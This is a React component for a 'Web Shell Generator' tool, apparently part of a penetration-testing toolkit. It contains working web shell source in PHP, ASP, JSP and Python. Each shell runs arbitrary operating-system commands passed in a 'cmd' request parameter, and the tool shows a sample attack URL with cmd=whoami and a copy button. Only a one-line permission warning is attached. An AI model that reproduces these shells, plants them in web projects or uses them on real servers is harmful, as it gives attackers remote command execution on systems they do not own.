import { useState } from 'react';
import { useStore } from '../../store/store';
import styles from './Tool.module.css';

export default function WebShellGenerator() {
  const { setActiveGalaxyTool } = useStore();
  const [language, setLanguage] = useState<'php' | 'asp' | 'jsp' | 'python'>('php');
  const [shellType, setShellType] = useState<'simple' | 'advanced'>('simple');
  const [output, setOutput] = useState('');

  const shells = {
    php: {
      simple: `<?php
if(isset($_REQUEST['cmd'])){
  echo "<pre>";
  $cmd = ($_REQUEST['cmd']);
  system($cmd);
  echo "</pre>";
  die;
}
?>`,
      advanced: `<?php
set_time_limit(0);
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
}
?>`
    },
    asp: {
      simple: `<%
szCMD = Request.Form("cmd")
If (szCMD <> "") Then
  Set oScript = Server.CreateObject("WSCRIPT.SHELL")
  Set oExec = oScript.Exec("cmd /c " & szCMD)
  Response.Write "<pre>" & Server.HTMLEncode(oExec.StdOut.ReadAll) & "</pre>"
End If
%>`,
      advanced: `<%
szCMD = Request.Form("cmd")
If (szCMD <> "") Then
  Set oScript = Server.CreateObject("WSCRIPT.SHELL")
  Set oExec = oScript.Exec("cmd /c " & szCMD)
  Response.Write "<pre>" & Server.HTMLEncode(oExec.StdOut.ReadAll) & "</pre>"
End If
%>`
    },
    jsp: {
      simple: `<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while((line = br.readLine()) != null) {
        out.println(line);
    }
}
%>`,
      advanced: `<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while((line = br.readLine()) != null) {
        out.println(line);
    }
}
%>`
    },
    python: {
      simple: `#!/usr/bin/env python3
import os, cgi
form = cgi.FieldStorage()
cmd = form.getvalue('cmd')
if cmd:
    os.system(cmd)`,
      advanced: `#!/usr/bin/env python3
import subprocess, cgi
form = cgi.FieldStorage()
cmd = form.getvalue('cmd')
if cmd:
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(result.stdout)`
    }
  };

  const generateShell = () => {
    const shell = shells[language][shellType];
    setOutput(shell);
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(output);
  };

  return (
    <div className={styles.toolContainer}>
      <div className={styles.toolHeader}>
        <button onClick={() => setActiveGalaxyTool(null)} className={styles.backButton}>
          ← Back
        </button>
        <h2 className={styles.toolTitle}>Web Shell Generator</h2>
      </div>
      <p className={styles.toolDescription}>
        Generate web shells in various languages for penetration testing
      </p>

      <div className={styles.inputGroup}>
        <label>Language:</label>
        <select 
          value={language} 
          onChange={(e) => setLanguage(e.target.value as typeof language)}
          className={styles.select}
        >
          <option value="php">PHP</option>
          <option value="asp">ASP</option>
          <option value="jsp">JSP</option>
          <option value="python">Python</option>
        </select>
      </div>

      <div className={styles.inputGroup}>
        <label>Shell Type:</label>
        <select 
          value={shellType} 
          onChange={(e) => setShellType(e.target.value as typeof shellType)}
          className={styles.select}
        >
          <option value="simple">Simple</option>
          <option value="advanced">Advanced</option>
        </select>
      </div>

      <button onClick={generateShell} className={styles.button}>
        Generate Shell
      </button>

      {output && (
        <div className={styles.resultSection}>
          <div className={styles.resultHeader}>
            <h3>Generated Web Shell:</h3>
            <button onClick={copyToClipboard} className={styles.copyButton}>
              Copy
            </button>
          </div>
          <pre className={styles.codeBlock}>{output}</pre>
          <div className={styles.info}>
            <strong>Usage:</strong> {language === 'python' 
              ? `http://target.com/shell.py?cmd=whoami`
              : `http://target.com/shell.${language}?cmd=whoami`
            }
          </div>
        </div>
      )}

      <div className={styles.warning}>
        ⚠️ Warning: Only use on systems you own or have explicit permission to test
      </div>
    </div>
  );
}
